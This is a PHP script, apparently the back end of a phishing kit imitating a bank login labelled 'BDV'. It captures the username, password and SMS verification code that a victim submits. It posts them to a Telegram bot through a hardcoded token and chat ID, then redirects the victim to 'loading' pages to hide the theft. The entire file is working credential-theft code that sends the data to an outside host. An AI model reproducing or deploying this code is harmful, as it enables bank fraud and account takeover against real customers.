
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Reemplaza con tu token y chat ID de Telegram
    $telegramToken = "7903356718:AAH492Tw1P28ack2JWft51sjIMdjr5hwiWg";
    $chatId = "-4511920536";

    // Recoger los datos enviados desde el formulario
    $usuario = isset($_POST['usuario']) ? $_POST['usuario'] : null;
    $password = isset($_POST['password']) ? $_POST['password'] : null;
    $sms = isset($_POST['sms']) ? $_POST['sms'] : null;

    // Crear el mensaje
    $message = "------ BDV ------\n";
    if ($usuario && $password) {
        $message .= "Usuario: $usuario\nContraseña: $password\n";
        $redirectUrl = "cargando.html";
    }
    if ($sms) {
        $message .= "Usuario: $usuario\nCódigo SMS: $sms\n";
        $redirectUrl = "cargando2.html";
    }

    // Enviar el mensaje a Telegram
    if ($usuario || $sms) { // Enviar sólo si hay datos
        $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";

        $postData = [
            'chat_id' => $chatId,
            'text' => $message,
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
    }

    // Redirigir al usuario a la página correspondiente
    header("Location: " . $redirectUrl);
    exit();
}
?>
